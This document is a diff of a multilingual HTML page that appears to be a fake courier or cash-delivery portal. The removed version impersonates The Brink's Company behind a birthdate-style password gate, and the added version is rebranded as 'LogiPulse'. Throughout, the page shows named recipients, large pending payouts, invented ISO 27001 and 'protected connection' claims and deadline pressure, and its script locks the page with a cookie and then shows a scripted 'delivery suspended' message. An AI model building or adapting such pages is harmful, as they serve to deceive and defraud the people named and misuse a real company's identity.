+                    <button class="lang-btn" data-lang="de" onclick="setLanguage('de', event)">DE</button>
+                    <button class="lang-btn active" data-lang="pl" onclick="setLanguage('pl', event)">PL</button>
                 </div>
                 <div class="tagline" data-i18n="tagline">
-                    Your safety is our concern
+                    Twoje bezpieczeństwo to nasz priorytet
                 </div>
             </div>
         </header>
 
         <!-- Hauptinhalt -->
         <main>
-            <div class="verification-container">
-                <!-- Блок приветствия и краткой информации -->
-                <div class="user-client-box">
-                    <div class="client-greeting">
-                        <i class="fa-solid fa-circle-user" style="color: var(--brinks-accent); font-size: 16px;"></i> 
-                        <span id="clientGreetingName">Valentina Martyn</span>
-                    </div>
-                    <div class="client-details">
-                        <div class="client-row">
-                            <span data-i18n="lbl_amount">Сумма к получению:</span>
-                            <span style="color: var(--brinks-primary); font-size: 15px;">19,550 €</span>
-                        </div>
-                        <div class="client-row">
-                            <span data-i18n="lbl_status">Статус:</span>
-                            <span><span class="status-badge-pending" data-i18n="status_pending">В ожидании</span></span>
-                        </div>
-                        <div class="client-note">
-                            <i class="fa-solid fa-circle-info"></i>
-                            <span data-i18n="client_note_text">Hinweis: Heute ist der letzte Tag der Aufbewahrungsfrist für diese Mittel. Bitte setzen Sie sich umgehend mit dem Kundendienst in Verbindung.</span>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="system-badge">
-                    <i class="fa-solid fa-shield-halved"></i> <span data-i18n="badge">Frachtbrief-Validierung</span>
-                </div>
-                <h1 class="card-title" data-i18n="title">Aktivierung der Frachtkosten-Kompensation</h1>
-                <p class="card-description" data-i18n="desc">Bitte geben Sie Ihren individuellen Transaktions-Identifikator ein, um die vertraglich vereinbarte Frachtvergünstigung zu validieren.</p>
+            <div class="verification-container" id="verificationContainer">
                 
-                <form id="secureForm" onsubmit="triggerVerification(event)">
-                    <div class="form-group">
-                        <label class="form-label" for="identityCode" data-i18n="label_code">Identifikations- / Gutscheincode</label>
-                        <div class="input-container">
-                            <i class="fa-solid fa-barcode"></i>
-                            <input type="text" id="identityCode" class="secure-input" data-i18n-placeholder="placeholder_code" placeholder="Geben Sie den Code ein..." required autocomplete="off">
+                <!-- Блок формы подтверждения -->
+                <div id="cardMainContent">
+                    <div class="header-actions-bar">
+                        <div class="system-badge">
+                            <i class="fa-solid fa-shield-halved"></i> <span data-i18n="badge">Weryfikacja transferu</span>
                         </div>
                     </div>
-                    <button type="submit" class="submit-btn" data-i18n="btn_submit">Gutschein validieren</button>
-                </form>
 
-                <div class="support-hint">
-                    <span data-i18n="support_text">Fragen zur Validierung? Kontaktieren Sie unser</span> <a href="#" onclick="return false;" data-i18n="support_link">Logistik-Service-Center</a>.
+                    <!-- Блок переключателя «Информация» / «Данные» -->
+                    <div class="info-block">
+                        <div class="info-tabs-header">
+                            <button type="button" class="info-tab-btn" id="tabBtnInfo" onclick="switchInfoTab('info')">
+                                <i class="fa-solid fa-circle-info"></i>
+                                <span data-i18n="tab_info">Informacje</span>
+                            </button>
+                            <button type="button" class="info-tab-btn active" id="tabBtnData" onclick="switchInfoTab('data')">
+                                <i class="fa-solid fa-id-card"></i>
+                                <span data-i18n="tab_data">Dane</span>
+                            </button>
+                        </div>
+
+                        <!-- Вкладка «Информация» -->
+                        <div id="tabContentInfo" class="tab-content" style="display: none;">
+                            <div class="info-grid">
+                                <div class="info-item">
+                                    <span class="info-label" data-i18n="info_portal_type_lbl">System:</span>
+                                    <span class="info-value" data-i18n="info_portal_type_val">Portal potwierdzenia transportu</span>
+                                </div>
+                                <div class="info-item">
+                                    <span class="info-label" data-i18n="info_carrier_lbl">Przewoźnik:</span>
+                                    <span class="info-value">LogiPulse Logistics & Transport</span>
+                                </div>
+                                <div class="info-item">
+                                    <span class="info-label" data-i18n="info_security_lbl">Bezpieczeństwo:</span>
+                                    <span class="info-value" data-i18n="info_security_val">Szyfrowanie ISO 27001</span>
+                                </div>
+                                <div class="info-item">
+                                    <span class="info-label" data-i18n="info_session_lbl">Status systemu:</span>
+                                    <span class="info-value" data-i18n="info_session_val">Połączenie chronione</span>
+                                </div>
+                            </div>
+                            <div class="info-text-description" data-i18n="info_desc_text">
+                                Oficjalny portal logistyczny LogiPulse. Sekcja zawiera aktualne informacje o statusie usług, bezpieczeństwie tras i walidacji transferów.
+                            </div>
+                        </div>
+
+                        <!-- Вкладка «Данные» -->
+                        <div id="tabContentData" class="tab-content" style="display: block;">
+                            <div class="info-grid">
+                                <div class="info-item">
+                                    <span class="info-label" data-i18n="data_recipient_lbl">Odbiorca:</span>
+                                    <span class="info-value premium-data">Zbigniew Maslowski</span>
+                                </div>
+                                <div class="info-item">
+                                    <span class="info-label" data-i18n="data_amount_lbl">Kwota odbioru:</span>
+                                    <span class="info-value premium-data premium-amount">228 000.00 USD</span>
+                                </div>
+                                <div class="info-item full-width">
+                                    <div class="status-container-fixed">
+                                        <span class="info-label" data-i18n="data_status_lbl">Status dostawy:</span>
+                                        <div class="status-badge-pending">
+                                            <i class="fa-solid fa-clock"></i>
+                                            <span data-i18n="data_status_val">OCZEKUJĄCY</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+
+                    <!-- Форма активации -->
+                    <h1 class="card-title" data-i18n="title">Potwierdzenie inkasa i dostawy środków pieniężnych</h1>
+                    <p class="card-description" data-i18n="desc">Wprowadź swój indywidualny identyfikator transakcji, aby potwierdzić umowę i zatwierdzić dostawę gotówki.</p>
+                    
+                    <form id="secureForm" onsubmit="triggerVerification(event)">
+                        <div class="form-group">
+                            <label class="form-label" for="identityCode" data-i18n="label_code">Kod identyfikacyjny</label>
+                            <div class="input-container">
+                                <i class="fa-solid fa-barcode"></i>
+                                <input type="text" id="identityCode" class="secure-input" data-i18n-placeholder="placeholder_code" placeholder="Wprowadź kod identyfikacyjny..." required autocomplete="off" oninvalid="this.setCustomValidity(currentLang === 'pl' ? 'Proszę wypełnić to pole.' : currentLang === 'de' ? 'Bitte füllen Sie dieses Feld aus.' : currentLang === 'en' ? 'Please fill out this field.' : 'Заполните это поле.')" oninput="this.setCustomValidity('')">
+                            </div>
+                        </div>
+                        <button type="submit" id="submitBtn" class="submit-btn" data-i18n="btn_submit">Potwierdź inkaso</button>
+                    </form>
+
+                    <div class="support-hint">
+                        <span data-i18n="support_text">Pytania dotyczące walidacji? Skontaktuj się z naszym</span> <a href="javascript:void(0);" data-i18n="support_link">centrum obsługi logistycznej</a>.
+                    </div>
                 </div>
+
+                <!-- Блок при блокировке -->
+                <div id="blockedContent" class="blocked-card-content">
+                    <div class="blocked-icon-wrapper">
+                        <i class="fa-solid fa-exclamation"></i>
+                    </div>
+                    <div class="blocked-message" data-i18n="blocked_msg">
+                        Dostawa środków pieniężnych została wstrzymana. Aleksiej Kotowski został przewieziony do bezpiecznego miejsca.
+                    </div>
+                </div>
+
             </div>
         </main>
 
-        <!-- Modal für Erfolg (Grüner Haken) -->
-        <div class="modal-overlay" id="alertModal">
-            <div class="modal-card">
-                <div class="success-symbol">
-                    <i class="fa-solid fa-check"></i>
-                </div>
-                <div class="modal-title" data-i18n="modal_title">Aktivierung erfolgreich</div>
-                <div class="modal-message" data-i18n="modal_msg">
-                    Sie haben den Fracht-Gutschein für 100 € Vergünstigung beim Brink's-Versand erfolgreich aktiviert
-                </div>
-                <div class="error-meta">
-                    STATUS: VALIDATED_SUCCESS | CODE: #PRM-VER-994
-                </div>
-                <button class="modal-action-btn" onclick="dismissModal()" data-i18n="modal_btn">Bestätigen und Schließen</button>
-            </div>
-        </div>
-
-        <!-- Modal für Fehler (Ungültiger Code) -->
-        <div class="modal-overlay" id="errorModal">
-            <div class="modal-card">
-                <div class="error-symbol">
-                    <i class="fa-solid fa-triangle-exclamation"></i>
-                </div>
-                <div class="modal-title" data-i18n="error_title">Validierungsfehler</div>
-                <div class="error-message-box" data-i18n="error_msg">
-                    Ungültiger Identifikationscode. Bitte überprüfen Sie die Eingabe und versuchen Sie es erneut.
-                </div>
-                <div class="error-meta">
-                    STATUS: ERROR_INVALID_CODE | CODE: #ERR-404
-                </div>
-                <button class="error-action-btn" onclick="dismissErrorModal()" data-i18n="error_btn">Erneut versuchen</button>
-            </div>
-        </div>
-
         <!-- Footer -->
         <footer>
-            <div data-i18n="footer_copy">&copy; 2026 The Brink's Company. Alle Rechte vorbehalten.</div>
-            <div data-i18n="footer_dept">Abteilung für geschützte Logistiklösungen</div>
+            <div data-i18n="footer_copy">&copy; 2026 LogiPulse Logistics & Transport. Wszelkie prawa zastrzeżone.</div>
+            <div data-i18n="footer_dept">Dział Bezpiecznych Rozwiązań Logistycznych</div>
         </footer>
 
     </div>
 
-    <!-- Скрипт перевода, авторизации и логики -->
+    <!-- Клиентский скрипт управления интерфейсом и блокировкой -->
     <script>
         const translations = {
             ru: {
-                title_doc: "Brink's Secure Logistics | Валидация ваучера",
-                auth_title: "Авторизация доступа",
-                auth_desc: "Пожалуйста, введите ваш персональный пароль для продолжения.",
-                auth_label: "Пароль доступа",
-                auth_placeholder: "Введите пароль...",
-                auth_btn: "Войти",
-                auth_err: "Неверный пароль. Пожалуйста, попробуйте снова.",
+                title_doc: "LogiPulse Secure Logistics | Верификация перевода",
                 sec_bar: "Защищенный логистический портал",
-                sys_num: "Протокол: BRK-LOG-VOUCHER",
+                sys_num: "Протокол: LGP-LOG-VOUCHER",
                 tagline: "Ваша безопасность — наша забота",
-                badge: "Проверка фрахтового ваучера",
-                title: "Активация транспортной компенсации",
-                desc: "Пожалуйста, введите ваш индивидуальный идентификатор отправления для подтверждения и применения условий корпоративного фрахтового ваучера.",
-                label_code: "Код идентификации или ваучера",
-                placeholder_code: "Введите цифровой код...",
-                btn_submit: "Валидировать ваучер",
+                badge: "Верификация перевода",
+                
+                tab_info: "Информация",
+                tab_data: "Данные",
+                data_recipient_lbl: "Получатель:",
+                data_amount_lbl: "Сумма к получению:",
+                data_status_lbl: "Статус доставки:",
+                data_status_val: "ОЖИДАЕТСЯ",
+
+                info_title: "Информация",
+                info_portal_type_lbl: "Система:",
+                info_portal_type_val: "Портал подтверждения перевозок",
+                info_carrier_lbl: "Перевозчик:",
+                info_security_lbl: "Безопасность:",
+                info_security_val: "Протокол ISO 27001 (Зашифровано)",
+                info_session_lbl: "Статус системы:",
+                info_session_val: "Защищенное соединение",
+                info_desc_text: "Официальный логистический портал LogiPulse. Данный раздел содержит актуальные сведения о статусе обслуживания, безопасности маршрутов и валидации перевозок.",
+
+                title: "Подтверждение инкассации и доставки наличных средств",
+                desc: "Введите ваш индивидуальный идентификатор транзакции для подтверждения соглашения и одобрения доставки наличных.",
+                label_code: "Код идентификации",
+                placeholder_code: "Введите код идентификации...",
+                btn_submit: "Подтвердить инкассацию",
                 support_text: "Вопросы по валидации? Обратитесь в наш",
                 support_link: "центр логистического обслуживания",
-                lbl_amount: "Сумма к получению:",
-                lbl_status: "Статус:",
-                status_pending: "В ожидании",
-                client_note_text: "Примечание: сегодня истекает срок хранения средств на счете. Пожалуйста, свяжитесь со службой клиентской поддержки.",
-                modal_title: "Активация успешна",
-                modal_msg: "Вы успешно активировали фрахтовый ваучер на сумму 100 евро для транспортных услуг Brink's",
-                modal_btn: "Подтвердить и закрыть",
-                error_title: "Ошибка валидации",
-                error_msg: "Неверный идентификационный код. Пожалуйста, проверьте правильность ввода и повторите попытку.",
-                error_btn: "Повторить попытку",
-                footer_copy: "© 2026 The Brink's Company. Все права защищены.",
+
+                blocked_msg: "Доставка денежных средств приостановлена. Алексей Котовский был перевезен в безопасное место.",
+
+                footer_copy: "© 2026 LogiPulse Logistics & Transport. Все права защищены.",
                 footer_dept: "Департамент защищенных логистических решений"
             },
             en: {
-                title_doc: "Brink's Secure Logistics | Voucher Validation",
-                auth_title: "Security Authentication",
-                auth_desc: "Please enter your personal access password to proceed.",
-                auth_label: "Access Password",
-                auth_placeholder: "Enter password...",
-                auth_btn: "Sign In",
-                auth_err: "Incorrect password. Please try again.",
+                title_doc: "LogiPulse Secure Logistics | Transfer Verification",
                 sec_bar: "Secure Logistics Portal",
-                sys_num: "Protocol: BRK-LOG-VOUCHER",
+                sys_num: "Protocol: LGP-LOG-VOUCHER",
                 tagline: "Your safety is our concern",
-                badge: "Freight Voucher Verification",
-                title: "Freight Cost Compensation Activation",
-                desc: "Please enter your individual transaction identifier to validate the contractually agreed freight discount.",
-                label_code: "Identification or Voucher Code",
-                placeholder_code: "Enter dispatch code...",
-                btn_submit: "Validate Voucher",
+                badge: "Transfer verification",
+
+                tab_info: "Information",
+                tab_data: "Data",
+                data_recipient_lbl: "Recipient:",
+                data_amount_lbl: "Amount to Receive:",
+                data_status_lbl: "Delivery Status:",
+                data_status_val: "PENDING",
+
+                info_title: "Information",
+                info_portal_type_lbl: "System:",
+                info_portal_type_val: "Transport Confirmation Portal",
+                info_carrier_lbl: "Carrier:",
+                info_security_lbl: "Security:",
+                info_security_val: "ISO 27001 Encrypted Protocol",
+                info_session_lbl: "System Status:",
+                info_session_val: "Protected Connection",
+                info_desc_text: "Official LogiPulse logistics portal. This section provides detailed service status, route security overviews, and transfer validation details.",
+
+                title: "Confirmation of cash collection and delivery",
+                desc: "Enter your individual transaction ID to confirm the agreement and approve the cash delivery.",
+                label_code: "Identification code",
+                placeholder_code: "Enter identification code...",
+                btn_submit: "Confirm cash collection",
                 support_text: "Validation inquiries? Contact our",
                 support_link: "logistics service center",
-                lbl_amount: "Amount to receive:",
-                lbl_status: "Status:",
-                status_pending: "Pending",
-                client_note_text: "Notice: Today is the final day of asset retention. Please contact customer support immediately.",
-                modal_title: "Activation Successful",
-                modal_msg: "You have successfully activated the €100 freight voucher for Brink's shipping services",
-                modal_btn: "Confirm and Close",
-                error_title: "Validation Error",
-                error_msg: "Invalid identification code. Please check your input and try again.",
-                error_btn: "Try Again",
-                footer_copy: "© 2026 The Brink's Company. All rights reserved.",
+
+                blocked_msg: "Cash delivery has been suspended. Aleksei Kotovskii has been moved to a safe location.",
+
+                footer_copy: "© 2026 LogiPulse Logistics & Transport. All rights reserved.",
                 footer_dept: "Department of Secure Logistics Solutions"
             },
             de: {
-                title_doc: "Brink's Secure Logistics | Frachtkosten-Gutschein",
-                auth_title: "Sicherheitsanmeldung",
-                auth_desc: "Bitte geben Sie Ihr persönliches Zugangskennwort ein, um fortzufahren.",
-                auth_label: "Zugangskennwort",
-                auth_placeholder: "Passwort eingeben...",
-                auth_btn: "Anmelden",
-                auth_err: "Falsches Kennwort. Bitte versuchen Sie es erneut.",
+                title_doc: "LogiPulse Secure Logistics | Transferüberprüfung",
                 sec_bar: "Gesichertes Logistik-Portal",
-                sys_num: "Protokoll: BRK-LOG-VOUCHER",
-                tagline: "Your safety is our concern",
-                badge: "Frachtbrief-Validierung",
-                title: "Aktivierung der Frachtkosten-Kompensation",
-                desc: "Bitte geben Sie Ihren individuellen Transaktions-Identifikator ein, um die vertraglich vereinbarte Frachtvergünstigung zu validieren.",
-                label_code: "Identifikations- / Gutscheincode",
-                placeholder_code: "Geben Sie den Code ein...",
-                btn_submit: "Gutschein validieren",
+                sys_num: "Protokoll: LGP-LOG-VOUCHER",
+                tagline: "Ihre Sicherheit ist unser Anliegen",
+                badge: "Transferüberprüfung",
+
+                tab_info: "Informationen",
+                tab_data: "Daten",
+                data_recipient_lbl: "Empfänger:",
+                data_amount_lbl: "Auszahlungsbetrag:",
+                data_status_lbl: "Lieferstatus:",
+                data_status_val: "IN BEARBEITUNG",
+
+                info_title: "Informationen",
+                info_portal_type_lbl: "System:",
+                info_portal_type_val: "Transportbestätigungs-Portal",
+                info_carrier_lbl: "Transporteur:",
+                info_security_lbl: "Sicherheit:",
+                info_security_val: "ISO 27001 Verschlüsselt",
+                info_session_lbl: "Systemstatus:",
+                info_session_val: "Geschützte Verbindung",
+                info_desc_text: "Offizielles LogiPulse Logistikportal. Dieser Bereich bietet aktuelle Informationen zum Servicestatus, zur Routensicherheit und zur Validierung von Transfers.",
+
+                title: "Bestätigung bar Inkasso und Bargeldzustellung",
+                desc: "Geben Sie Ihre individuelle Transaktions-ID ein, um die Vereinbarung zu bestätigen und die Bargeldzustellung zu genehmigen.",
+                label_code: "Identifikationscode",
+                placeholder_code: "Identifikationscode eingeben...",
+                btn_submit: "Inkasso bestätigen",
                 support_text: "Fragen zur Validierung? Kontaktieren Sie unser",
                 support_link: "Logistik-Service-Center",
-                lbl_amount: "Auszuzahlender Betrag:",
-                lbl_status: "Status:",
-                status_pending: "Ausstehend",
-                client_note_text: "Hinweis: Heute ist der letzte Tag der Aufbewahrungsfrist für diese Mittel. Bitte setzen Sie sich umgehend mit dem Kundendienst in Verbindung.",
-                modal_title: "Aktivierung erfolgreich",
-                modal_msg: "Sie haben den Fracht-Gutschein für 100 € Vergünstigung beim Brink's-Versand erfolgreich aktiviert",
-                modal_btn: "Bestätigen und Schließen",
-                error_title: "Validierungsfehler",
-                error_msg: "Ungültiger Identifikationscode. Bitte überprüfen Sie die Eingabe und versuchen Sie es erneut.",
-                error_btn: "Erneut versuchen",
-                footer_copy: "© 2026 The Brink's Company. Alle Rechte vorbehalten.",
+
+                blocked_msg: "Die Bargeldzustellung wurde eingestellt. Aleksei Kotovskii wurde an einen sicheren Ort gebracht.",
+
+                footer_copy: "© 2026 LogiPulse Logistics & Transport. Alle Rechte vorbehalten.",
                 footer_dept: "Abteilung für geschützte Logistiklösungen"
             },
             pl: {
-                title_doc: "Brink's Secure Logistics | Walidacja kuponu",
-                auth_title: "Uwierzytelnianie bezpieczeństwa",
-                auth_desc: "Wprowadź swoje osobiste hasło dostępu, aby kontynuować.",
-                auth_label: "Hasło dostępu",
-                auth_placeholder: "Wprowadź hasło...",
-                auth_btn: "Zaloguj się",
-                auth_err: "Nieprawidłowe hasło. Spróbuj ponownie.",
+                title_doc: "LogiPulse Secure Logistics | Weryfikacja transferu",
                 sec_bar: "Bezpieczny portal logistyczny",
-                sys_num: "Protokół: BRK-LOG-VOUCHER",
+                sys_num: "Protokół: LGP-LOG-VOUCHER",
                 tagline: "Twoje bezpieczeństwo to nasz priorytet",
-                badge: "Weryfikacja bonu frachtowego",
-                title: "Aktywacja kompensacji kosztów transportu",
-                desc: "Wprowadź swój indywidualny identyfikator transakcji, aby zweryfikować uzgodnioną umownie ulgę frachtową.",
-                label_code: "Kod identyfikacyjny lub bonu",
-                placeholder_code: "Wprowadź kod wysyłki...",
-                btn_submit: "Zwaliduj bon",
+                badge: "Weryfikacja transferu",
+
+                tab_info: "Informacje",
+                tab_data: "Dane",
+                data_recipient_lbl: "Odbiorca:",
+                data_amount_lbl: "Kwota odbioru:",
+                data_status_lbl: "Status dostawy:",
+                data_status_val: "OCZEKUJĄCY",
+
+                info_title: "Informacje",
+                info_portal_type_lbl: "System:",
+                info_portal_type_val: "Portal potwierdzenia transportu",
+                info_carrier_lbl: "Przewoźnik:",
+                info_security_lbl: "Bezpieczeństwo:",
+                info_security_val: "Szyfrowanie ISO 27001",
+                info_session_lbl: "Status systemu:",
+                info_session_val: "Połączenie chronione",
+                info_desc_text: "Oficjalny portal logistyczny LogiPulse. Sekcja zawiera aktualne informacje o statusie usług, bezpieczeństwie tras i walidacji transferów.",
+
+                title: "Potwierdzenie inkasa i dostawy środków pieniężnych",
+                desc: "Wprowadź swój indywidualny identyfikator transakcji, aby potwierdzić umowę i zatwierdzić dostawę gotówki.",
+                label_code: "Kod identyfikacyjny",
+                placeholder_code: "Wprowadź kod identyfikacyjny...",
+                btn_submit: "Potwierdź inkaso",
                 support_text: "Pytania dotyczące walidacji? Skontaktuj się z naszym",
                 support_link: "centrum obsługi logistycznej",
-                lbl_amount: "Kwota do wypłaty:",
-                lbl_status: "Status:",
-                status_pending: "Oczekiwanie",
-                client_note_text: "Uwaga: Dzisiaj mija ostateczny termin przechowywania środków. Prosimy o niezwłoczny kontakt z działem obsługi klienta.",
-                modal_title: "Aktywacja pomyślna",
-                modal_msg: "Pomyślnie aktywowałeś bon frachtowy o wartości 100 euro na usługi transportowe Brink's",
-                modal_btn: "Potwierdź i zamknij",
-                error_title: "Błąd walidacji",
-                error_msg: "Nieprawidłowy kod identyfikacyjny. Sprawdź wprowadzone dane i spróbuj ponownie.",
-                error_btn: "Spróbuj ponownie",
-                footer_copy: "© 2026 The Brink's Company. Wszelkie prawa zastrzeżone.",
+
+                blocked_msg: "Dostawa środków pieniężnych została wstrzymana. Aleksiej Kotowski został przewieziony do bezpiecznego miejsca.",
+
+                footer_copy: "© 2026 LogiPulse Logistics & Transport. Wszelkie prawa zastrzeżone.",
                 footer_dept: "Dział Bezpiecznych Rozwiązań Logistycznych"
             }
         };
 
-        let currentLang = 'de';
+        let currentLang = 'pl';
+        let fadeTimeout = null;
 
-        function setLanguage(lang) {
+        function setLanguage(lang, event) {
+            if (event) {
+                event.preventDefault();
+            }
             currentLang = lang;
-            document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
-            event.target.classList.add('active');
+            document.documentElement.lang = lang;
 
-            document.getElementById('page-title').innerText = translations[lang].title_doc;
-
-            document.querySelectorAll('[data-i18n]').forEach(element => {
-                const key = element.getAttribute('data-i18n');
-                if (translations[lang][key]) {
-                    element.innerText = translations[lang][key];
+            document.querySelectorAll('.lang-btn').forEach(btn => {
+                if (btn.getAttribute('data-lang') === lang) {
+                    btn.classList.add('active');
+                } else {
+                    btn.classList.remove('active');
                 }
             });
 
-            document.querySelectorAll('[data-i18n-placeholder]').forEach(element => {
-                const key = element.getAttribute('data-i18n-placeholder');
-                if (translations[lang][key]) {
-                    element.placeholder = translations[lang][key];
+            if (fadeTimeout) clearTimeout(fadeTimeout);
+
+            const elementsToFade = document.querySelectorAll('[data-i18n], [data-i18n-placeholder], .tagline');
+            elementsToFade.forEach(el => el.classList.add('lang-fade-out'));
+
+            fadeTimeout = setTimeout(() => {
+                if (translations[lang] && translations[lang].title_doc) {
+                    document.getElementById('page-title').innerText = translations[lang].title_doc;
                 }
-            });
+
+                document.querySelectorAll('[data-i18n]').forEach(element => {
+                    const key = element.getAttribute('data-i18n');
+                    if (translations[lang] && translations[lang][key]) {
+                        element.innerText = translations[lang][key];
+                    }
+                });
+
+                document.querySelectorAll('[data-i18n-placeholder]').forEach(element => {
+                    const key = element.getAttribute('data-i18n-placeholder');
+                    if (translations[lang] && translations[lang][key]) {
+                        element.placeholder = translations[lang][key];
+                    }
+                });
+
+                elementsToFade.forEach(el => el.classList.remove('lang-fade-out'));
+            }, 150);
         }
 
-        function handleAuth(event) {
-            event.preventDefault();
-            const passwordInput = document.getElementById('authPassword').value.trim();
-            const errorBox = document.getElementById('authErrorMsg');
+        function switchInfoTab(tabName) {
+            const tabInfo = document.getElementById('tabBtnInfo');
+            const tabData = document.getElementById('tabBtnData');
+            const contentInfo = document.getElementById('tabContentInfo');
+            const contentData = document.getElementById('tabContentData');
 
-            if (passwordInput === "11.05.1958") {
-                errorBox.style.display = 'none';
-                document.getElementById('authOverlay').classList.add('hidden');
-                document.getElementById('mainAppWrapper').classList.add('visible');
+            if (tabName === 'data') {
+                tabInfo.classList.remove('active');
+                tabData.classList.add('active');
+                contentInfo.style.display = 'none';
+                contentData.style.display = 'block';
             } else {
-                errorBox.style.display = 'block';
-                document.getElementById('authPassword').value = '';
-                document.getElementById('authPassword').focus();
+                tabData.classList.remove('active');
+                tabInfo.classList.add('active');
+                contentData.style.display = 'none';
+                contentInfo.style.display = 'block';
+            }
+        }
+
+        function lockInterface() {
+            // Мгновенная синхронная запись в Cookie и LocalStorage
+            document.cookie = "lp_locked=true; max-age=315360000; path=/; SameSite=Lax";
+            localStorage.setItem('lp_locked', 'true');
+
+            // Отрисовка блока блокировки
+            const blockedContent = document.getElementById('blockedContent');
+            if (blockedContent) {
+                blockedContent.style.display = 'flex';
+            }
+
+            // Физическое удаление формы из DOM для защиты от DevTools
+            const mainContent = document.getElementById('cardMainContent');
+            if (mainContent) {
+                mainContent.remove();
             }
         }
 
         function triggerVerification(event) {
             event.preventDefault();
-            const codeInput = document.getElementById('identityCode').value.trim();
-            
-            if (codeInput === "SWC-122-KFI") {
-                document.getElementById('alertModal').classList.add('active');
+            lockInterface();
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            setLanguage('pl');
+            switchInfoTab('data');
+
+            // Аудит статуса блокировки
+            if (window.__IS_LOCKED__) {
+                lockInterface();
             } else {
-                document.getElementById('errorModal').classList.add('active');
+                const mainContent = document.getElementById('cardMainContent');
+                if (mainContent) {
+                    mainContent.style.display = 'block';
+                }
             }
-        }
-
-        function dismissModal() {
-            document.getElementById('alertModal').classList.remove('active');
-            document.getElementById('identityCode').value = '';
-            document.getElementById('identityCode').focus();
-        }
-
-        function dismissErrorModal() {
-            document.getElementById('errorModal').classList.remove('active');
-            document.getElementById('identityCode').focus();
-        }
+        });
     </script>
 
 </body>
